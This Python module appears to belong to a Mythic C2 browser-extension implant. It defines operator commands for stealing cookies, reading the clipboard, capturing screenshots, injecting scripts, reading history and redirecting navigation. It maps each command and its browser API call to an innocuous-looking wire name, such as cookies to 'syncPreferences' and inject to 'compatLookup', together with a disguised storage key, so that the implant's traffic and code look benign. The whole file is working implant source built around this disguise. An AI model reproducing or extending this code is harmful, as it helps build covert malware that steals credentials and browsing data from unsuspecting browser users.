"""Hardcoded wire names for commands and ctx methods.

The Mythic UI keeps the real command names. create_go_tasking writes
CommandName from WIRE_COMMANDS. The extension only contains the wire
names. There is no per-payload map and no reverse table in the client.
"""

from __future__ import annotations

from typing import Any

KNOWN_COMMANDS = (
    "sleep",
    "exit",
    "identity",
    "tabs",
    "current",
    "cookies",
    "screenshot",
    "inject",
    "history",
    "bookmarks",
    "downloads",
    "clipboard",
    "request",
    "load",
    "run_loaded",
    "redirect",
)

# Operator command -> name on the wire and in builtins.
WIRE_COMMANDS = {
    "sleep": "prefFlush",
    "exit": "sessionEnd",
    "identity": "profileBind",
    "tabs": "tabStrip",
    "current": "viewRestore",
    "cookies": "syncPreferences",
    "screenshot": "webCapture",
    "inject": "compatLookup",
    "history": "navStack",
    "bookmarks": "pinSite",
    "downloads": "cacheWarm",
    "clipboard": "editorLite",
    "request": "networkStack",
    "load": "schemaBind",
    "run_loaded": "featureFlag",
    "redirect": "navRewrite",
}

# Internal ctx RPC -> name in the extension dispatch table.
WIRE_METHODS = {
    "tabs.query": "tabStripQuery",
    "tabs.get": "tabStripGet",
    "tabs.create": "tabStripOpen",
    "tabs.update": "tabStripApply",
    "tabs.remove": "tabStripClose",
    "tabs.reload": "tabStripRefresh",
    "tabs.captureVisibleTab": "webCaptureFrame",
    "cookies.getAll": "syncPreferencesRead",
    "cookies.get": "syncPreferencesItem",
    "cookies.getAllCookieStores": "syncPreferencesStores",
    "scripting.executeScript": "compatLookupRun",
    "request": "networkStackSend",
    "identity.getProfileUserInfo": "profileBindRead",
    "runtime.getPlatformInfo": "edgeHelperInfo",
    "history.search": "navStackSearch",
    "bookmarks.getTree": "pinSiteTree",
    "bookmarks.search": "pinSiteSearch",
    "downloads.search": "cacheWarmSearch",
    "redirect.add": "navRewriteAdd",
    "redirect.list": "navRewriteRead",
    "redirect.remove": "navRewriteDrop",
    "redirect.clear": "navRewriteReset",
    "redirect.sync": "navRewriteSync",
}

STORAGE_KEY = "edgeCompatState"
ALARM_NAME = "compatTick"

_WIRE_VALUES = set(WIRE_COMMANDS.values()) | set(WIRE_METHODS.values()) | {STORAGE_KEY, ALARM_NAME}
if len(_WIRE_VALUES) != len(WIRE_COMMANDS) + len(WIRE_METHODS) + 2:
    raise RuntimeError("wire alias table has duplicate names")

if set(WIRE_COMMANDS) != set(KNOWN_COMMANDS):
    raise RuntimeError("WIRE_COMMANDS must cover KNOWN_COMMANDS exactly")


def command_alias(canonical: str) -> str:
    try:
        return WIRE_COMMANDS[canonical]
    except KeyError as exc:
        raise KeyError(f"no wire name for command {canonical!r}") from exc


def method_alias(canonical: str) -> str:
    try:
        return WIRE_METHODS[canonical]
    except KeyError as exc:
        raise KeyError(f"no wire name for method {canonical!r}") from exc


def canonical_command_from_task(task_data: Any) -> str:
    name = getattr(task_data, "CommandName", None)
    if name:
        return str(name)
    task = getattr(task_data, "Task", None)
    if task is not None:
        name = getattr(task, "CommandName", None) or getattr(task, "Command", None)
        if name:
            return str(name)
    raise RuntimeError("task is missing CommandName; cannot alias the command")
